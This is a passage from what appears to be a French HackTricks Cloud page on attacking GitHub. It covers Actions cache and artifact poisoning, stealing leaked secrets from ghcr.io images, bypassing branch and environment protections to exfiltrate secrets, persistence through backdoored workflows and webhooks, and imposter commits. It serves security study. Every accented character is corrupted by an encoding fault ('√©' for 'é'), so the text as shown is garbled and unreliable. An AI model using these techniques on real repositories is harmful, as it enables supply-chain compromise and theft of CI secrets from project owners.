* **Action post-workflow** - utilis√©e pour enregistrer le cache. Si le r√©sultat de l'appel au cache dans l'action de run renvoie un cache-miss, cette action enregistrera l'√©tat actuel des r√©pertoires que nous voulons mettre en cache avec la cl√© fournie. Cette action se produit automatiquement et n'a pas besoin d'√™tre appel√©e explicitement.

Les **restrictions d'acc√®s** fournissent une **isolation du cache** et une s√©curit√© en cr√©ant une **fronti√®re logique entre les diff√©rentes branches** _(par exemple : un cache cr√©√© pour la branche **Feature-A** \[avec la base main] ne serait pas accessible √† une pull request pour la branche **Feature-B** \[avec la base main])_.

L'action de cache recherche d'abord les hits de cache pour une cl√© et restaure les cl√©s dans la branche contenant l'**ex√©cution du workflow**. S'il n'y a pas de hits dans la branche actuelle, l'action de cache recherche la cl√© et restaure les cl√©s dans la branche parente et les branches en amont.

L'acc√®s √† un cache est limit√© par branche (actuelle et parente), ce qui signifie que l'acc√®s est fourni √† tous les **workflows** √† travers les **ex√©cutions** de ladite branche.

Une autre note importante est que GitHub n'autorise pas les modifications une fois que les entr√©es sont pouss√©es - les entr√©es de cache sont des enregistrements en lecture seule.

Nous avons utilis√© un exemple de CI qui comprenait deux workflows. Cet exemple montre comment une attaque peut passer d'un workflow √† faible autorisation √† un workflow √† autorisation √©lev√©e.

* Le workflow **Unit-test** ex√©cute des tests unitaires et des outils de couverture de code. Nous supposons que l'un des outils est malveillant ou vuln√©rable √† l'ex√©cution de code √† distance. Le workflow n'a pas besoin d'utiliser l'action **action/cache** Git. Tout workflow peut acc√©der au cache.
* Le workflow **Release** construit et publie l'artefact de l'application. Ce workflow utilise un cache pour optimiser l'utilisation des d√©pendances Golang.

Le workflow **unit-test** utilise une action malveillante qui ajoute une entr√©e de cache avec un contenu malveillant en modifiant une biblioth√®que de journalisation Golang (**go.uber.org/zap@v1**) pour ajouter la cha√Æne "BAD library" √† la description de l'artefact de l'application.

Ensuite, le workflow **release** utilise cette entr√©e de cache empoisonn√©e. En cons√©quence, le code malveillant est inject√© dans le binaire Golang et l'image construite. Le cache reste empoisonn√© jusqu'√† ce que la cl√© d'entr√©e soit supprim√©e (g√©n√©ralement d√©clench√©e par des mises √† jour de d√©pendances). Le m√™me cache empoisonn√© affectera tout autre **workflow**, **ex√©cution** et **branche enfant** utilisant la m√™me cl√© de cache.

Dans le test que nous avons effectu√©, nous avons r√©ussi √† injecter la cha√Æne "BAD library" dans la description de l'image :

![BAD library](https://scribesecurity.com/wp-content/uploads/2022/02/BAD-library-2-300x79.jpg)

C'√©tait dans la version 0.4.1. Ensuite, nous avons mis √† jour le tag et reconstruit l'image plusieurs fois, et nous avons observ√© que "Bad library" restait dans la description.

Ces techniques ont √©t√© tir√©es de [https://scribesecurity.com/blog/github-cache-poisoning/](https://scribesecurity.com/blog/github-cache-poisoning/)

### Empoisonnement des artefacts

Il existe plusieurs actions Github qui permettent de **t√©l√©charger des artefacts √† partir d'autres d√©p√¥ts**. Ces autres d√©p√¥ts auront g√©n√©ralement une action Github pour **t√©l√©charger l'artefact** qui sera ensuite t√©l√©charg√©.

Si l'**action Github** du d√©p√¥t qui t√©l√©charge l'artefact autorise les d√©clencheurs **`pull_request`** ou **`pull_request_target`** (en utilisant le code de l'attaquant), un attaquant pourra d√©clencher l'action qui t√©l√©chargera un artefact cr√©√© √† partir de son code, de sorte que tout autre d√©p√¥t t√©l√©chargeant et ex√©cutant le dernier artefact sera compromis.

{% hint style="info" %}
Comme mentionn√© dans une section de cet article, les **`pull_requests`** n√©cessitent g√©n√©ralement une **approbation manuelle** d'un mainteneur du d√©p√¥t.
{% endhint %}

Exemple de **t√©l√©chargement d'artefact √† partir d'un d√©p√¥t diff√©rent** :

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Comme mentionn√© pr√©c√©demment, lors d'un d√©clenchement de **`pull_request`**, l'action d√©finie dans la PR est celle qui est ex√©cut√©e. Ainsi, un **attaquant** pourrait **d√©finir** dans **celle-ci** le **t√©l√©chargement de l'artefact** qu'il souhaite compromettre.

Par cons√©quent, un attaquant n'a pas besoin d'attaquer un d√©clencheur de **`pull_request`** dans l'action de t√©l√©chargement de l'artefact, mais simplement n'importe quel d√©clencheur de **`pull_request`**.
{% endhint %}

Pour plus d'informations et d'options de d√©fense (comme le codage en dur de l'artefact √† t√©l√©charger), consultez [https://www.legitsecurity.com/blog/artifact-poisoning-vulnerability-discovered-in-rust](https://www.legitsecurity.com/blog/artifact-poisoning-vulnerability-discovered-in-rust)
### Piratage de d√©p√¥t de namespace supprim√©

Ceci est un bon article de blog √† lire sur les vuln√©rabilit√©s corrig√©es qui permettraient √† un attaquant de voler un namespace supprim√© pour voler un d√©p√¥t c√©l√®bre (potentiellement en raison d'un changement de nom du namespace) : [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

### Registre d'images Docker Github

Il est possible de cr√©er des actions Github qui permettront de **construire et stocker une image Docker √† l'int√©rieur de Github**.\
Un exemple peut √™tre trouv√© dans l'expansible suivante :

<details>

<summary>Action Github pour construire et pousser une image Docker</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Comme vous pouvez le voir dans le code pr√©c√©dent, le registre Github est h√©berg√© sur **`ghcr.io`**.

Un utilisateur disposant des permissions de lecture sur le d√©p√¥t pourra alors t√©l√©charger l'image Docker en utilisant un jeton d'acc√®s personnel :
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Ensuite, l'utilisateur peut rechercher les **secrets divulgu√©s dans les couches de l'image Docker :**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

## Contournement de la protection de branche

* **Exiger un certain nombre d'approbations** : Si vous avez compromis plusieurs comptes, vous pouvez simplement accepter vos PR √† partir d'autres comptes. Si vous avez seulement acc√®s au compte √† partir duquel vous avez cr√©√© la PR, vous ne pouvez pas accepter votre propre PR. Cependant, si vous avez acc√®s √† un environnement **Github Action** √† l'int√©rieur du r√©f√©rentiel, en utilisant le **GITHUB\_TOKEN**, vous pourriez √™tre en mesure d'**approuver votre PR** et d'obtenir une approbation de cette mani√®re.
* _Notez que pour cette restriction et pour la restriction des propri√©taires de code, un utilisateur ne pourra g√©n√©ralement pas approuver ses propres PR, mais si vous le pouvez, vous pouvez en abuser pour accepter vos PR._
* **Ignorer les approbations lorsque de nouveaux commits sont pouss√©s** : Si cela n'est pas activ√©, vous pouvez soumettre du code l√©gitime, attendre qu'il soit approuv√©, puis ajouter du code malveillant et le fusionner dans la branche prot√©g√©e.
* **Exiger des avis des propri√©taires de code** : Si cela est activ√© et que vous √™tes un propri√©taire de code, vous pouvez faire en sorte qu'une **Github Action cr√©e votre PR et l'approuve vous-m√™me**.
* Lorsqu'un fichier **CODEOWNER est mal configur√©**, Github ne se plaint pas mais ne l'utilise pas. Par cons√©quent, s'il est mal configur√©, sa **protection des propri√©taires de code n'est pas appliqu√©e**.
* **Autoriser certains acteurs √† contourner les exigences des pull requests** : Si vous √™tes l'un de ces acteurs, vous pouvez contourner les protections des pull requests.
* **Inclure les administrateurs** : Si cela n'est pas activ√© et que vous √™tes administrateur du r√©f√©rentiel, vous pouvez contourner ces protections de branche.
* **D√©tournement de PR** : Vous pourriez √™tre en mesure de **modifier la PR de quelqu'un d'autre** en ajoutant du code malveillant, en approuvant la PR r√©sultante vous-m√™me et en fusionnant le tout.
* **Suppression des protections de branche** : Si vous √™tes un **administrateur du r√©f√©rentiel, vous pouvez d√©sactiver les protections**, fusionner votre PR et r√©activer les protections.
* **Contournement des protections de push** : Si un r√©f√©rentiel **autorise uniquement certains utilisateurs** √† envoyer des push (fusion de code) dans les branches (la protection de branche peut prot√©ger toutes les branches en sp√©cifiant le joker `*`).
* Si vous avez **acc√®s en √©criture au r√©f√©rentiel mais que vous n'√™tes pas autoris√© √† pousser du code** en raison de la protection de branche, vous pouvez toujours **cr√©er une nouvelle branche** et y cr√©er une **action github qui est d√©clench√©e lorsque du code est pouss√©**. Comme la **protection de branche ne prot√©gera pas la branche tant qu'elle n'est pas cr√©√©e**, ce premier push de code vers la branche **ex√©cutera l'action github**.

## Contournement des protections d'environnement

Pour une introduction sur [**Github Environment, consultez les informations de base**](basic-github-information.md#git-environments).

Dans le cas o√π un environnement peut √™tre **acc√©d√© depuis toutes les branches**, il n'est pas prot√©g√© et vous pouvez facilement acc√©der aux secrets √† l'int√©rieur de l'environnement. Notez que vous pourriez trouver des r√©f√©rentiels o√π **toutes les branches sont prot√©g√©es** (en sp√©cifiant leurs noms ou en utilisant `*`) dans ce sc√©nario, **trouvez une branche o√π vous pouvez pousser du code** et vous pouvez **exfiltrer** les secrets en cr√©ant une nouvelle action github (ou en la modifiant).

Notez que vous pourriez rencontrer le cas limite o√π **toutes les branches sont prot√©g√©es** (via le joker `*`) et il est sp√©cifi√© **qui peut pousser du code dans les branches** (_vous pouvez le sp√©cifier dans la protection de branche_) et **votre utilisateur n'est pas autoris√©**. Vous pouvez toujours ex√©cuter une action github personnalis√©e car vous pouvez cr√©er une branche et utiliser la g√¢chette de push sur elle-m√™me. La **protection de branche autorise le push vers une nouvelle branche, donc l'action github sera d√©clench√©e**.
```yaml
push: # Run it when a push is made to a branch
branches:
- current_branch_name #Use '**' to run when a push is made to any branch
```
Notez qu'**apr√®s la cr√©ation** de la branche, la **protection de la branche s'appliquera √† la nouvelle branche** et vous ne pourrez pas la modifier, mais √† ce moment-l√†, vous aurez d√©j√† r√©cup√©r√© les secrets.

## Persistance

* G√©n√©rer un **jeton d'utilisateur**
* Voler les **jetons Github** depuis les **secrets**
* **Supprimer** les **r√©sultats** et les **branches** du flux de travail
* Donner **plus de permissions √† toute l'organisation**
* Cr√©er des **webhooks** pour exfiltrer des informations
* Inviter des **collaborateurs externes**
* **Supprimer** les **webhooks** utilis√©s par le **SIEM**
* Cr√©er/modifier une **Action Github** avec une **porte d√©rob√©e**
* Trouver une **Action Github vuln√©rable √† l'injection de commandes** via la modification de la valeur **secret**

### Commits d'usurpation - Porte d√©rob√©e via les commits du d√©p√¥t

Sur Github, il est possible de **cr√©er une demande de fusion (PR) vers un d√©p√¥t √† partir d'une bifurcation (fork)**. M√™me si la PR n'est **pas accept√©e**, un identifiant de **commit** dans le d√©p√¥t d'origine sera cr√©√© pour la version bifurqu√©e du code. Par cons√©quent, un attaquant **pourrait √©pingler l'utilisation d'un commit sp√©cifique provenant d'un d√©p√¥t apparemment l√©gitime qui n'a pas √©t√© cr√©√© par le propri√©taire du d√©p√¥t**.

Comme [**ici**](https://github.com/actions/checkout/commit/c7d749a2d57b4b375d1ebcd17cfbfb60c676f18e) :
```yaml
name: example
on: [push]
jobs:
commit:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@c7d749a2d57b4b375d1ebcd17cfbfb60c676f18e
- shell: bash
run: |
echo 'hello world!'
```
Pour plus d'informations, consultez [https://www.chainguard.dev/unchained/what-the-fork-imposter-commits-in-github-actions-and-ci-cd](https://www.chainguard.dev/unchained/what-the-fork-imposter-commits-in-github-actions-and-ci-cd)

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
